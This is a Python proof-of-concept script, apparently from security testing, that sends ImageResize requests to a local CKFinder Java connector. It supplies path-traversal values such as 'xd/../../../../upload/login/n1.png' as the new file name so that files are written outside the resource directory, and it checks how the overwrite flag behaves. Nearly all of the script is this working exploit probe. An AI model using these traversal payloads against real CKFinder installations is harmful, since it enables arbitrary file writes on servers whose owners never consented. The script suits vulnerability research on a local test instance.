#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""确认 2.1 的 overwrite 行为：资源目录内重复输出到同一路径是否也被拒。"""
import re
import urllib.error
import urllib.parse
import urllib.request

TOKEN = "0123456789abcdef0123456789abcdef01234567"
EP = "http://127.0.0.1:8080/ckfinder/core/connector/java/connector.java"


def post(fields):
    payload = dict(fields)
    payload.setdefault("CKFinderCommand", "true")
    body = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(EP, data=body, method="POST")
    req.add_header("Cookie", "ckCsrfToken=" + TOKEN)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            t = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        t = e.read().decode("utf-8", "replace")
    m = re.search(r'<Error number="(-?\d+)"[^>]*>([^<]*)<', t)
    return (m.group(1), m.group(2)) if m else ("?", t[:80])


def resize(target, overwrite=None, width="10", height="10"):
    f = {"command": "ImageResize", "type": "Images", "currentFolder": "/",
         "fileName": "src_t1.png", "newFileName": target,
         "width": width, "height": height, "ckCsrfToken": TOKEN}
    if overwrite is not None:
        f["overwrite"] = overwrite
    return post(f)


print("=== 资源目录内（不涉及穿越） ===")
print("  第 1 次写 xd/a.png          :", resize("xd/a.png", "1"))
print("  第 2 次写同一路径 overwrite=1:", resize("xd/a.png", "1"))
print("  第 3 次写同一路径 无 overwrite:", resize("xd/a.png"))

print("\n=== 穿越到资源目录之外（全新目标，不存在） ===")
print("  新目标 + overwrite=1        :", resize("xd/../../../../upload/login/n1.png", "1"))
print("  再写同一目标 + overwrite=1  :", resize("xd/../../../../upload/login/n1.png", "1"))
